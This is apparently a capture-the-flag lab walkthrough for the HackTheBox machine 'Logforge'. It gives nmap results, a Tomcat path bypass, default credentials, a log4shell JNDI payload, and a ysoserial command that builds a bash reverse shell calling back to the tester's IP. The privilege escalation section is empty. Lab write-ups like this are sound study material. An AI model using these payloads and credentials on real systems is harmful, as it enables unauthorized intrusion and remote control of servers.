# Logforge

## NMAP
```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-21 14:02 EST
Nmap scan report for 10.10.11.138
Host is up (0.084s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp   open     http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp filtered http-proxy
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.92 seconds
```

- all UDP ports are closed.

## Foothold
- no subdomains found
- no subdirs/files found
- use `logrforge.htb/agami/..;/manager/html` to reach the tomcat server
- use `admin:tomcat` or similar creds to login into tomcat
- we cant add a .war file for a reverse shell
- we see a different application. 
    - given the name of the box, start a nc listener at 1389, enter a log4shell `${jndi:ldap://10.10.14.14:1389/agami}` payload in the idle parameter and see a response on the nc listener.
- install `ysoserial-modified` and `jndi-exploit-kit`
- use the below line to generate the serialized payload.
```
java \                                                              
    --add-opens java.management/javax.management=ALL-UNNAMED \
    --add-opens java.base/java.util=ALL-UNNAMED \
    -jar ysoserial-modified.jar CommonsCollections6 bash 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1' > payload.ser
```
- `java -jar JNDI-Exploit-Kit.jar -L 10.10.14.14:1389 -P /home/kali/tools/ysoserial/payload.ser`
    - use the ldap urls in the log4shell payloads in the idle parameter.



## PrivEsc
- 
